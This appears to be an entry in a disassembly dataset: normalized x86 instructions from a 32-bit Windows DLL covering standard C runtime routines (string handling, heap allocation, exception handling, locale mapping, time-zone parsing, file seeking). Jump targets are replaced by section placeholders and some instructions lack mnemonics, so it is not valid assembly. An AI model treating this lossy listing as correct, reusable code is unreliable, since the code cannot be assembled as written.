cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10008e74
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_10009048
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_10006a09
push ebx
call sub_10006e13
push 0x9
mov edi eax
call sub_10006a6a
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_10004940
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_10008f04
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_100045aa
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_10004568
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_100045aa
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_1000463e
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_10008fe4
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_1000a9e1
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_1000842c
pop esi
retn 0x4
sub_10009048
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_10009080
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10009140
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10009150
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10009230
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100092b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_100092e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1000931a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000b6af
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_10004190
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_10004190
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_10009540
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_10009570
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_10009be6
add esp 0x1c
test eax eax
jne r-xdata
sub_100095f0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10009624
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_10006a09
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_10006a6a
pop ecx
call sub_10009652
inc [ rw-data ]
sub_10009652
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_10006a09
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_1000aa99
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_10006a6a
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_10006a6a
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_1000413e
push esi
call sub_10009230
inc eax
push eax
call sub_100049d2
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_10008df0
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_10009140
push edi
call sub_10006a6a
push 0x3
push esi
push [ rw-data ]
call sub_10003f20
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_1000504c
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_1000504c
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_10003f20
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_1000504c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_100098fa
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_10009aa6
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_10009aa6
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_10009aa6
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_10009aa6
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_10009aa6
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_10009be6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_10004190
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_10004940
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_10009d30
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_10006a09
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_10006a6a
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_1000ab98
mov ebx eax
add esp 0x4
call sub_1000ab98
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_10009e00
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000a5c6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_10009e65
push esi
mov edi eax
call sub_1000a625
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_10009e65
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000a584
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_10004f88
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_10004f15
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_10009ed8
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000a5c6
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_10009f3d
push esi
mov edi eax
call sub_1000a625
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_10009f3d
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
